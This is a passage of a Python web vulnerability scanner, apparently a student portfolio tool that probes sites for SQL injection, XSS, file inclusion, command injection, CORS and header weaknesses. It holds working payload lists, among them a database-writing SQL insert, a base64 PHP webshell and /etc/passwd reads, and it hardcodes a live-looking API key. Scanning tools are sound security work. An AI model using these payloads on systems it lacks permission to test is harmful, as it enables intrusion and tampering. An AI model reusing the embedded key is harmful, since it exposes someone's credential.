#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║          ADVANCED WEB VULNERABILITY SCANNER v2.0                 ║
║          IIT Kanpur B.Cyber Portfolio Project                    ║
║  ⚠  ONLY use on targets you OWN or have written permission for   ║
╚══════════════════════════════════════════════════════════════════╝
"""

import requests
import socket
import ssl
import json
import time
import re
import sys
import threading
from datetime import datetime
from urllib.parse import urlparse, urljoin, urlencode, parse_qsl
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import warnings

warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

# ── Optional Imports ──────────────────────────────────────────────────────────
try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import whois as whois_lib
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    import google.generativeai as genai
    GEMINI_AVAILABLE = True
except ImportError:
    GEMINI_AVAILABLE = False

init(autoreset=True)

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════
# अपनी Gemini API Key यहाँ डालें
GEMINI_API_KEY  = "AIzaSyBoeGzFL_bcwC6Llezpk-EZb66JHOuMMnA"   

REQUEST_TIMEOUT = 8
MAX_THREADS     = 15
SCAN_DELAY      = 0.25   # seconds between requests (be polite)

# Colors
R = Fore.RED;    G = Fore.GREEN;  Y = Fore.YELLOW
B = Fore.BLUE;   C = Fore.CYAN;   M = Fore.MAGENTA
W = Fore.WHITE;  BOLD = Style.BRIGHT;  DIM = Style.DIM
RESET = Style.RESET_ALL

# ══════════════════════════════════════════════════════════════════════════════
#  PAYLOADS
# ══════════════════════════════════════════════════════════════════════════════

SQL_PAYLOADS = [
    "'", '"', "\\", "''", "` ",
    "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
    "' OR 1=1#", "\" OR 1=1--", "\" OR \"1\"=\"1",
    "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "1 AND 1=1", "1 AND 1=2",
    "' AND '1'='1", "' AND '1'='2",
    "' AND SLEEP(3)--",                           
    "1; WAITFOR DELAY '0:0:3'--",                  
    "'; SELECT pg_sleep(3)--",                     
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "admin'--", "admin'#", "' OR 'x'='x",
    "') OR ('1'='1", "admin' OR 1=1--",
    "%27", "1%27 OR 1=1", "%27 OR %271%27=%271",
    "' GROUP BY 1--", "' HAVING 1=1--",
    "'; INSERT INTO users VALUES('hacked','hacked')--",
]

SQL_ERRORS = [
    r"sql syntax.*mysql", r"warning.*mysql_", r"mysql_fetch_array\(",
    r"unclosed quotation mark", r"quoted string not properly terminated",
    r"you have an error in your sql syntax",
    r"check the manual that corresponds to your (mysql|mariadb) server",
    r"microsoft ole db provider for odbc drivers",
    r"ole db provider for odbc", r"odbc microsoft access",
    r"microsoft jet database engine error",
    r"pg_exec\(\)", r"pg_query\(\)", r"error.*postgresql",
    r"supplied argument is not a valid mysql",
    r"ora-\d{5}", r"oracle error", r"warning.*oci_",
    r"sqlite_.*error", r"error.*sqlite", r"unable to prepare statement",
    r"sql server.*driver", r"\[sql server\]",
    r"mssql_query\(", r"odbc_exec\(",
    r"syntax error.*in query expression",
    r"data type mismatch in criteria",
    r"invalid column name", r"unknown column",
    r"table .* doesn.*exist", r"column .* doesn.*exist",
    r"sql command not properly ended",
    r"right syntax to use near",
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><script>alert(document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<body onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '"><input autofocus onfocus=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    'javascript:alert(1)',
    '{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
]

SENSITIVE_FILES = [
    "/.env", "/.env.local", "/.env.backup", "/.env.prod", "/.env.dev",
    "/.env.example", "/.env.staging",
    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
    "/.git/FETCH_HEAD", "/.svn/entries",
    "/config.php", "/wp-config.php", "/configuration.php",
    "/config.inc.php", "/settings.php", "/local.php",
    "/config.yml", "/config.yaml", "/config.json",
    "/database.yml", "/database.php", "/db.php",
    "/secrets.yml", "/credentials.yml", "/application.yml",
    "/.htaccess", "/.htpasswd", "/web.config", "/.user.ini",
    "/phpinfo.php", "/info.php", "/test.php", "/php.php",
    "/backup.sql", "/dump.sql", "/db.sql", "/database.sql",
    "/data.sql", "/backup.db", "/site.db",
    "/backup.zip", "/backup.tar.gz", "/www.zip", "/site.zip",
    "/htdocs.zip", "/public_html.zip",
    "/robots.txt", "/sitemap.xml",
    "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/xmlrpc.php", "/wp-login.php", "/wp-cron.php",
    "/joomla.xml", "/configuration.php.bak",
    "/composer.json", "/composer.lock",
    "/package.json", "/yarn.lock", "/package-lock.json",
    "/.DS_Store", "/Thumbs.db", "/.idea/workspace.xml",
    "/readme.md", "/README.md", "/INSTALL.md", "/CHANGELOG.md",
    "/server-status", "/server-info",
    "/.bash_history", "/.viminfo",
    "/api/v1/users", "/api/users", "/api/config", "/api/debug",
    "/swagger.json", "/swagger.yaml", "/openapi.json",
    "/api-docs", "/api-docs/swagger.json",
    "/graphql", "/graphiql", "/__debug__",
]

ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/login", "/admin/index.php",
    "/admin/dashboard", "/admin/home",
    "/administrator", "/administrator/index.php",
    "/wp-admin", "/wp-admin/", "/wp-login.php",
    "/phpmyadmin", "/phpmyadmin/", "/pma/", "/mysql/",
    "/cpanel", "/whm", "/plesk", "/webmin",
    "/dashboard", "/dashboard/login",
    "/panel", "/control-panel", "/controlpanel",
    "/manage", "/management", "/backend",
    "/cms", "/cms/admin", "/cms/login",
    "/login", "/login.php", "/login.html",
    "/signin", "/sign-in", "/sign_in",
    "/user/login", "/account/login", "/auth/login",
    "/secure", "/private", "/restricted",
    "/moderator", "/moderator/login",
    "/sysadmin", "/root",
    "/console", "/terminal",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../etc/passwd%00",   
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",  
    "/etc/passwd",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "..\\..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]

LFI_INDICATORS = [
    "root:x:", "bin:x:", "daemon:x:",   
    "[extensions]", "[fonts]",           
    "localhost\t127",                    
    "PD9waHAg",                          
]

CMD_INJECTION_PAYLOADS = [
    "; id", "| id", "` id`", "$(id)",
    "; whoami", "| whoami",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "; ls -la", "| ls -la",
    "; ping -c 2 127.0.0.1", "& ping -c 2 127.0.0.1",
    "; sleep 3", "| sleep 3", "` sleep 3`",
    "$(sleep 3)",
    "& dir", "| dir",
    "& type C:\\windows\\win.ini",
    "& ping 127.0.0.1 -n 2",
]

CMD_INDICATORS = [
    "uid=", "gid=", "groups=",        
    "root:", "daemon:",                
    "total ", "drwxr", "drwx",        
    "PING", "bytes from",             
    "[fonts]", "[extensions]",        
    "Volume in drive",                
]

OPEN_REDIRECT_PARAMS = [
    "redirect", "url", "next", "return", "returnTo", "return_url",
    "redirect_url", "redirect_uri", "goto", "target", "redir",
    "destination", "dest", "to", "link", "forward", "continue",
    "successUrl", "failureUrl", "callback", "back",
]

SECURITY_HEADERS = {
    "X-Frame-Options": {
        "desc": "Prevents Clickjacking attacks",
        "recommended": "DENY  or  SAMEORIGIN",
        "risk": "HIGH",
    },
    "X-XSS-Protection": {
        "desc": "Enables browser built-in XSS filter",
        "recommended": "1; mode=block",
        "risk": "MEDIUM",
    },
    "X-Content-Type-Options": {
        "desc": "Prevents MIME-type sniffing attacks",
        "recommended": "nosniff",
        "risk": "MEDIUM",
    },
    "Strict-Transport-Security": {
        "desc": "Forces HTTPS connections (HSTS)",
        "recommended": "max-age=31536000; includeSubDomains; preload",
        "risk": "HIGH",
    },
    "Content-Security-Policy": {
        "desc": "Prevents XSS and data injection attacks",
        "recommended": "default-src 'self'; script-src 'self'",
        "risk": "HIGH",
    },
    "Referrer-Policy": {
        "desc": "Controls referrer header information",
        "recommended": "strict-origin-when-cross-origin",
        "risk": "LOW",
    },
    "Permissions-Policy": {
        "desc": "Controls browser feature access (camera, mic, etc)",
        "recommended": "geolocation=(), microphone=(), camera=()",
        "risk": "LOW",
    },
}


# ══════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ══════════════════════════════════════════════════════════════════════════════

def print_banner():
    print(f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════════╗
║   ██╗    ██╗███████╗██████╗     ███████╗ ██████╗ █████╗    ║
║   ██║    ██║██╔════╝██╔══██╗    ██╔════╝██╔════╝██╔══██╗   ║
║   ██║ █╗ ██║█████╗  ██████╔╝    ███████╗██║     ███████║   ║
║   ██║███╗██║██╔══╝  ██╔══██╗    ╚════██║██║     ██╔══██║   ║
║   ╚███╔███╔╝███████╗██████╔╝    ███████║╚██████╗██║  ██║   ║
║    ╚══╝╚══╝ ╚══════╝╚═════╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝   ║
╠══════════════════════════════════════════════════════════════╣
║          Advanced Web Vulnerability Scanner v2.0             ║
║          IIT Kanpur B.Cyber Portfolio Project                ║
║   ⚠  Authorized Testing Only — Illegal otherwise ⚠         ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {
        "INFO": f"{B}[*]{RESET}",
        "OK":   f"{G}[+]{RESET}",
        "VULN": f"{R}[!]{RESET}",
        "WARN": f"{Y}[~]{RESET}",
        "SKIP": f"{DIM}[-]{RESET}",
        "HEAD": f"{M}[#]{RESET}",
    }
    print(f"{DIM}[{ts}]{RESET} {icons.get(level, '[?]')} {msg}")


def section(title):
    print(f"\n{C}{BOLD}{'═' * 62}")
    print(f"  ▶  {title}")
    print(f"{'═' * 62}{RESET}")


def req(url, method="GET", params=None, data=None,
        headers=None, allow_redirects=True):
    h = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/122.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    if headers:
        h.update(headers)
    try:
        return requests.request(
            method, url,
            params=params, data=data, headers=h,
            allow_redirects=allow_redirects,
            timeout=REQUEST_TIMEOUT, verify=False,
        )
    except requests.exceptions.ConnectionError:
        return None
    except requests.exceptions.Timeout:
        return None
    except Exception:
        return None


# ══════════════════════════════════════════════════════════════════════════════
#  MODULES
# ══════════════════════════════════════════════════════════════════════════════

class ReconModule:
    def __init__(self, target_url):
        self.url    = target_url
        self.parsed = urlparse(target_url)
        self.host   = self.parsed.netloc.split(":")[0]
        self.results = {}

    def run(self):
        section("MODULE 1 — RECONNAISSANCE")
        self._resolve_ip()
        self._dns_records()
        self._whois()
        self._fingerprint()
        self._check_robots()
        return self.results

    def _resolve_ip(self):
        try:
            ip = socket.gethostbyname(self.host)
            self.results["ip"] = ip
            log(f"IP Address   : {G}{ip}{RESET}", "OK")
        except socket.gaierror:
            self.results["ip"] = "Unresolved"
            log("Could not resolve hostname to IP", "WARN")

    def _dns_records(self):
        if not DNS_AVAILABLE:
            log("dnspython not installed — skipping DNS records", "SKIP")
            return
        dns_data = {}
        for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]:
            try:
                answers = dns.resolver.resolve(self.host, rtype)
                records = [str(r) for r in answers]
                dns_data[rtype] = records
                log(f"DNS {rtype:<6}: {G}{', '.join(records[:3])}{RESET}", "OK")
            except Exception:
                pass
        self.results["dns"] = dns_data

    def _whois(self):
        if not WHOIS_AVAILABLE:
            log("python-whois not installed — skipping WHOIS", "SKIP")
            return
        try:
            w = whois_lib.whois(self.host)
            created = w.creation_date
            if isinstance(created, list):
                created = created[0]
            expiry = w.expiration_date
            if isinstance(expiry, list):
                expiry = expiry[0]
            self.results["whois"] = {
                "registrar": str(w.registrar or "N/A"),
                "created":   str(created or "N/A"),
                "expiry":    str(expiry or "N/A"),
                "country":   str(w.country or "N/A"),
            }
            log(f"Registrar    : {G}{w.registrar}{RESET}", "OK")
            log(f"Created      : {G}{created}{RESET}", "OK")
            log(f"Expires      : {G}{expiry}{RESET}", "OK")
        except Exception as e:
            log(f"WHOIS failed : {e}", "WARN")

    def _fingerprint(self):
        resp = req(self.url)
        if not resp:
            return
        headers = resp.headers
        tech     = []
        issues   = []

        server = headers.get("Server", "")
        if server:
            tech.append(f"Server: {server}")
            log(f"Server       : {Y}{server}{RESET}  ← information disclosure!", "WARN")

        powered = headers.get("X-Powered-By", "")
        if powered:
            tech.append(f"X-Powered-By: {powered}")
            log(f"X-Powered-By : {R}{powered}{RESET}  ← version disclosed!", "VULN")
            issues.append(f"X-Powered-By header discloses: {powered}")

        body = resp.text.lower()
        cms_signatures = {
            "WordPress":  ["wp-content", "wp-includes", "wordpress"],
            "Joomla":     ["joomla", "/components/", "/modules/"],
            "Drupal":     ["drupal", "sites/default/files"],
            "Magento":    ["magento", "mage/cookies.js"],
            "Shopify":    ["shopify", "cdn.shopify.com"],
            "Laravel":    ["laravel", "laravel_session"],
            "Django":     ["csrfmiddlewaretoken", "django"],
            "Rails":      ["rails-ujs", "authenticity_token"],
            "React":      ["__react", "react-root", "_reactrootcontainer"],
        }
        for cms, sigs in cms_signatures.items():
            body_and_cookies = body + str(headers.get("Set-Cookie", "")).lower()
            if any(s in body_and_cookies for s in sigs):
                tech.append(f"CMS/Framework: {cms}")
                log(f"CMS/Framework: {Y}{cms} detected{RESET}", "WARN")

        cookie_issues = []
        for cookie in resp.cookies:
            flags = []
            if not cookie.secure:
                flags.append("Missing 'Secure' flag (sent over HTTP!)")
            raw_cookies = headers.get("Set-Cookie", "")
            if "httponly" not in raw_cookies.lower() and cookie.name in raw_cookies:
                flags.append("Missing 'HttpOnly' flag (JS can steal this!)")
            if "samesite" not in raw_cookies.lower():
                flags.append("Missing 'SameSite' flag (CSRF risk!)")
            if flags:
                msg = f"Cookie '{cookie.name}': {', '.join(flags)}"
                cookie_issues.append(msg)
                log(f"{R}Cookie Issue{RESET}: {msg}", "VULN")

        self.results["technologies"]   = tech
        self.results["info_disclosure"] = issues
        self.results["cookie_issues"]   = cookie_issues

    def _check_robots(self):
        robots_url = urljoin(self.url, "/robots.txt")
        resp = req(robots_url)
        if resp and resp.status_code == 200:
            lines      = resp.text.split("\n")
            disallowed = [l.strip() for l in lines if l.lower().startswith("disallow")]
            log(f"robots.txt   : {G}Found{RESET} ({len(disallowed)} Disallow entries)", "OK")
            for d in disallowed[:8]:
                log(f"  {Y}{d}{RESET}  ← potential sensitive path!", "WARN")
            self.results["robots_disallowed"] = disallowed
        else:
            log("robots.txt   : Not found", "INFO")


class SecurityHeadersModule:
    def __init__(self, target_url):
        self.url     = target_url
        self.results = {"missing": [], "present": [], "misconfigured": []}

    def run(self):
        section("MODULE 2 — SECURITY HEADERS")
        resp = req(self.url)
        if not resp:
            log("Cannot reach target", "WARN")
            return self.results

        headers = {k.lower(): v for k, v in resp.headers.items()}

        for header, info in SECURITY_HEADERS.items():
            h_lower = header.lower()
            risk_color = R if info["risk"] == "HIGH" else (Y if info["risk"] == "MEDIUM" else W)
            if h_lower in headers:
                val = headers[h_lower]
                log(f"{G}✓ PRESENT{RESET} {header}: {DIM}{val}{RESET}", "OK")
                self.results["present"].append({"header": header, "value": val})
                self._check_weak_value(header, val)
            else:
                log(
                    f"{R}✗ MISSING{RESET}  {header}  "
                    f"[{risk_color}{info['risk']} RISK{RESET}]  — {info['desc']}",
                    "VULN"
                )
                self.results["missing"].append({
                    "header": header,
                    "risk":   info["risk"],
                    "desc":   info["desc"],
                    "fix":    f"{header}: {info['recommended']}",
                })

        for h in ["Server", "X-Powered-By", "X-AspNet-Version",
                   "X-AspNetMvc-Version", "X-Generator", "X-Drupal-Cache"]:
            if h.lower() in headers:
                val = headers[h.lower()]
                log(f"{Y}⚠ LEAK{RESET}    {h}: {val}  ← remove this!", "WARN")
                self.results["misconfigured"].append({
                    "header": h, "value": val,
                    "issue": "Technology/version information disclosure",
                    "fix": f"Remove or blank the '{h}' response header",
                })

        return self.results

    def _check_weak_value(self, header, value):
        weak_checks = {
            "X-Frame-Options": lambda v: (
                "allow-from" in v.lower() and
                "sameorigin" not in v.lower() and
                "deny" not in v.lower()
            ),
            "X-XSS-Protection":     lambda v: v.strip() == "0",
            "Strict-Transport-Security": lambda v: "max-age" not in v.lower(),
            "Content-Security-Policy": lambda v: (
                "unsafe-inline" in v or "unsafe-eval" in v or "'*'" in v
            ),
        }
        check = weak_checks.get(header)
        if check and check(value):
            log(f"  {Y}↳ Weak value for {header}{RESET} — see recommended config", "WARN")
            self.results["misconfigured"].append({
                "header": header, "value": value,
                "issue": "Insecure / weak configuration detected",
                "fix": f"Set to: {SECURITY_HEADERS[header]['recommended']}",
            })


class SSLModule:
    def __init__(self, target_url):
        self.url    = target_url
        self.parsed = urlparse(target_url)
        self.host   = self.parsed.hostname
        self.results = {}

    def run(self):
        section("MODULE 3 — SSL/TLS ANALYSIS")
        if self.parsed.scheme != "https":
            log(f"{R}CRITICAL: Site NOT using HTTPS!{RESET} All traffic is plaintext.", "VULN")
            self.results["https"] = False
            self.results["vuln"]  = "No HTTPS — data transmitted in cleartext"
            return self.results

        self.results["https"] = True
        self._cert_info()
        self._http_redirect()
        return self.results

    def _cert_info(self):
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=self.host) as s:
                s.settimeout(6)
                s.connect((self.host, 443))
                cert    = s.getpeercert()
                version = s.version()

            log(f"TLS Version  : {G}{version}{RESET}", "OK")
            if version in ("TLSv1", "TLSv1.1"):
                log(f"{R}Weak TLS version {version}!{RESET} Upgrade to TLS 1.2+", "VULN")

            exp_str  = cert.get("notAfter", "")
            exp_date = datetime.strptime(exp_str, "%b %d %H:%M:%S %Y %Z")
            days     = (exp_date - datetime.utcnow()).days

            if days < 0:
                log(f"{R}CERT EXPIRED {abs(days)} days ago!{RESET}", "VULN")
            elif days < 15:
                log(f"{R}CERT expires in {days} days — URGENT!{RESET}", "VULN")
            elif days < 30:
                log(f"{Y}CERT expires in {days} days (renew soon)", "WARN")
            else:
                log(f"Cert expires : {G}{days} days remaining{RESET}", "OK")

            subject = dict(x[0] for x in cert.get("subject", []))
            issuer  = dict(x[0] for x in cert.get("issuer",  []))
            cn      = subject.get("commonName", "N/A")
            org     = issuer.get("organizationName", "N/A")

            log(f"Common Name  : {G}{cn}{RESET}", "OK")
            log(f"Issuer       : {G}{org}{RESET}", "OK")

            sans = [san[1] for san in cert.get("subjectAltName", [])]
            if sans:
                log(f"SANs         : {G}{', '.join(sans[:5])}{RESET}", "OK")

            self.results["cert"] = {
                "days_left": days, "cn": cn,
                "issuer": org, "tls_version": version,
            }

        except ssl.SSLCertVerificationError as e:
            log(f"{R}SSL CERT VERIFICATION FAILED: {e}{RESET}", "VULN")
            self.results["cert_error"] = str(e)
        except Exception as e:
            log(f"SSL check error: {e}", "WARN")

    def _http_redirect(self):
        http_url = self.url.replace("https://", "http://")
        resp = req(http_url, allow_redirects=False)
        if resp:
            if resp.status_code in (301, 302, 307, 308):
                loc = resp.headers.get("Location", "")
                if "https://" in loc:
                    log(f"HTTP→HTTPS   : {G}Redirect configured ✓{RESET}", "OK")
                else:
                    log(f"{Y}HTTP redirect does not force HTTPS!{RESET}", "WARN")
            elif resp.status_code == 200:
                log(f"{R}HTTP accessible without redirect!{RESET} Users can use insecure version.", "VULN")


class SensitiveFilesModule:
    def __init__(self, target_url):
        self.base    = target_url.rstrip("/")
        self.results = {"sensitive": [], "admin_panels": []}

    def run(self):
        section("MODULE 4 — SENSITIVE FILES & ADMIN PANEL DISCOVERY")
        log(f"Scanning {len(SENSITIVE_FILES)} sensitive paths ...", "INFO")
        self._scan(SENSITIVE_FILES, "sensitive")
        log(f"Scanning {len(ADMIN_PATHS)} admin panel paths ...", "INFO")
        self._scan(ADMIN_PATHS, "admin_panels")
        return self.results

    def _scan(self, paths, category):
        def probe(path):
            url  = self.base + path
            resp = req(url, allow_redirects=False)
            if resp and resp.status_code in (200, 401, 403):
                return path, resp.status_code, len(resp.content)
            return None

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
            futures = {ex.submit(probe, p): p for p in paths}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    path, status, size = result
                    label = "EXPOSED" if status == 200 else "EXISTS(protected)"
                    color = R      if status == 200 else Y
                    log(
                        f"{color}[{status}] {label}{RESET}  {self.base}{path}"
                        f"  ({size} bytes)",
                        "VULN"
                    )
                    self.results[category].append({
                        "path": path, "url": self.base + path,
                        "status": status, "size": size,
                    })
        time.sleep(SCAN_DELAY)


class SQLInjectionModule:
    def __init__(self, target_url):
        self.url     = target_url
        self.results = {"vulnerable": [], "tested": 0}

    def run(self):
        section("MODULE 5 — SQL INJECTION TESTING")
        self._test_url_params()
        self._test_forms()
        log(f"Total payloads tested: {Y}{self.results['tested']}{RESET}", "INFO")
        return self.results

    def _test_url_params(self):
        parsed = urlparse(self.url)
        if not parsed.query:
            log("No URL parameters found — skipping URL param SQLi", "INFO")
            return

        params = dict(parse_qsl(parsed.query))
        log(f"URL params: {list(params.keys())} — testing {len(SQL_PAYLOADS)} payloads each", "INFO")

        for param in params:
            for payload in SQL_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload
                resp = req(self.url, params=test_params)
                self.results["tested"] += 1

                if not resp:
                    continue

                body_lower = resp.text.lower()
                for err_pattern in SQL_ERRORS:
                    if re.search(err_pattern, body_lower, re.IGNORECASE):
                        vuln = {
                            "type":    "Error-Based SQLi",
                            "param":   param,
                            "payload": payload,
                            "error":   err_pattern,
                            "url":     self.url,
                        }
                        if vuln not in self.results["vulnerable"]:
                            self.results["vulnerable"].append(vuln)
                            log(
                                f"{R}★ SQL INJECTION FOUND!{RESET}  "
                                f"Param: {Y}'{param}'{RESET}  Payload: {Y}{payload[:35]}{RESET}",
                                "VULN"
                            )
                        break
                time.sleep(SCAN_DELAY)

    def _test_forms(self):
        resp = req(self.url)
        if not resp:
            return
        soup  = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            log("No HTML forms found", "INFO")
            return

        log(f"Found {len(forms)} form(s) — testing for SQLi", "INFO")
        for i, form in enumerate(forms):
            action = urljoin(self.url, form.get("action", self.url))
            method = form.get("method", "get").lower()

            fields = {}
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name", "")
                if name:
                    fields[name] = inp.get("value", "test123")

            if not fields:
                continue

            for field in fields:
                for payload in SQL_PAYLOADS[:12]:   
                    data = fields.copy()
                    data[field] = payload
                    self.results["tested"] += 1

                    resp2 = (req(action, method="POST", data=data)
                             if method == "post"
                             else req(action, params=data))
                    if not resp2:
                        continue

                    body_lower = resp2.text.lower()
                    for err_pattern in SQL_ERRORS:
                        if re.search(err_pattern, body_lower, re.IGNORECASE):
                            vuln = {
                                "type":     "Error-Based SQLi (Form)",
                                "form":     action,
                                "method":   method.upper(),
                                "field":    field,
                                "payload":  payload,
                            }
                            self.results["vulnerable"].append(vuln)
                            log(
                                f"{R}★ SQL INJECTION (FORM)!{RESET}  "
                                f"Field: {Y}'{field}'{RESET}  Form: {action[:40]}",
                                "VULN"
                            )
                            break
                    time.sleep(SCAN_DELAY)


class XSSModule:
    def __init__(self, target_url):
        self.url     = target_url
        self.results = {"vulnerable": [], "ssti": [], "tested": 0}

    def run(self):
        section("MODULE 6 — CROSS-SITE SCRIPTING (XSS)")
        self._test_url_params()
        self._test_forms()
        log(f"Total payloads tested: {Y}{self.results['tested']}{RESET}", "INFO")
        return self.results

    def _test_url_params(self):
        parsed = urlparse(self.url)
        if not parsed.query:
            log("No URL parameters for XSS testing", "INFO")
            return
        params = dict(parse_qsl(parsed.query))
        
        for param in params:
            for payload in XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload
                resp = req(self.url, params=test_params)
                self.results["tested"] += 1

                if resp and payload in resp.text:
                    if payload in ("{{7*7}}", "${7*7}", "#{7*7}") and "49" in resp.text:
                        log(f"{R}★ SSTI DETECTED!{RESET} Server-Side Template Injection!", "VULN")
                        self.results["ssti"].append({"param": param, "payload": payload})
                    else:
                        vuln = {
                            "type": "Reflected XSS",
                            "param": param, "payload": payload,
                            "url": self.url,
                        }
                        self.results["vulnerable"].append(vuln)
                        log(
                            f"{R}★ XSS FOUND!{RESET}  "
                            f"Param: {Y}'{param}'{RESET}  Payload reflected!",
                            "VULN"
                        )
                    break
                time.sleep(SCAN_DELAY)

    def _test_forms(self):
        resp = req(self.url)
        if not resp:
            return
        soup  = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            return

        for form in forms:
            action = urljoin(self.url, form.get("action", self.url))
            method = form.get("method", "get").lower()
            fields = {
                inp.get("name"): "safe"
                for inp in form.find_all(["input", "textarea"])
                if inp.get("name") and inp.get("type", "text").lower()
                   not in ["submit", "hidden", "image"]
            }
            for field in fields:
                for payload in XSS_PAYLOADS[:10]:
                    data = fields.copy()
                    data[field] = payload
                    self.results["tested"] += 1

                    resp2 = (req(action, method="POST", data=data)
                             if method == "post"
                             else req(action, params=data))
                    if resp2 and payload in resp2.text:
                        self.results["vulnerable"].append({
                            "type": "Reflected XSS (Form)",
                            "form": action, "field": field, "payload": payload,
                        })
                        log(
                            f"{R}★ XSS (FORM)!{RESET}  "
                            f"Field: {Y}'{field}'{RESET}  Action: {action[:40]}",
                            "VULN"
                        )
                        break
                    time.sleep(SCAN_DELAY)


class CORSModule:
    def __init__(self, target_url):
        self.url     = target_url
        self.results = {"vulnerable": []}

    def run(self):
        section("MODULE 7 — CORS MISCONFIGURATION")
        test_origins = [
            "https://evil-attacker.com",
            "null",
            f"https://{urlparse(self.url).hostname}.evil.com",
            "https://attacker.example.com",
        ]
        for origin in test_origins:
            resp = req(self.url, headers={"Origin": origin})
            if not resp:
                continue
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "false")

            if acao == "*":
                log(f"{Y}CORS Wildcard (*){RESET} — OK unless credentials are used", "WARN")
            elif acao == origin:
                sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
                log(
                    f"{R}★ CORS MISCONFIGURATION!{RESET}  Origin '{Y}{origin}{RESET}' reflected",
                    "VULN"
                )
                self.results["vulnerable"].append({
                    "origin": origin, "acao": acao,
                    "credentials": acac, "severity": sev,
                })
            else:
                pass
        return self.results


class HTTPMethodsModule:
    def __init__(self, target_url):
        self.url     = target_url
        self.results = {"allowed": [], "dangerous": []}

    def run(self):
        section("MODULE 8 — DANGEROUS HTTP METHODS")
        dangerous = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]

        resp = req(self.url, method="OPTIONS")
        if resp:
            allow_header = (
                resp.headers.get("Allow", "") or
                resp.headers.get("Access-Control-Allow-Methods", "")
            )
            if allow_header:
                methods = [m.strip() for m in allow_header.split(",")]
                self.results["allowed"] = methods
                for m in dangerous:
                    if m in methods:
                        log(f"{R}★ Dangerous method ALLOWED: {m}{RESET}", "VULN")
                        self.results["dangerous"].append(m)

        resp = req(self.url, method="TRACE")
        if resp and resp.status_code == 200 and "TRACE" in resp.text.upper():
            log(f"{R}★ TRACE enabled — XST attack possible!{RESET}", "VULN")
            self.results["dangerous"].append("TRACE")

        return self.results


class OtherVulnsModule:
    def __init__(self, target_url):
        self.url     = target_url
        self.results = {"lfi": [], "cmd_injection": [],
                        "open_redirect": [], "csrf": []}

    def run(self):
        section("MODULE 9 — LFI / CMD INJECTION / OPEN REDIRECT / CSRF")
        self._test_lfi_and_cmd()
        self._test_open_redirect()
        self._test_csrf()
        return self.results

    def _test_lfi_and_cmd(self):
        parsed = urlparse(self.url)
        if not parsed.query:
            return

        params = dict(parse_qsl(parsed.query))
        file_params = {
            k: v for k, v in params.items()
